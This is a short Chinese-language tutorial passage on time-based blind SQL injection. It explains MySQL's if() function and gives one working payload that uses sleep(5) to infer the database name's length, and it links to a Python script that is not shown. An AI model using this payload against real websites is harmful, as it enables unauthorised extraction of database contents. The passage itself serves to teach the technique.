同 布尔盲注一样，使用if， 将第二个参数改成sleep(5)（延时5秒），第三个参数可以直接用1

> if(expr1,expr2,expr3)
> expr1 的值为 TRUE，则返回值为 expr2 
> expr1 的值为 FALSE，则返回值为 expr3

```
?id=1 and if(length(database())>10,sleep(5),1)#
```

脚本：

[time_based_injection.py](../python-scripts/time_based_injection.py)
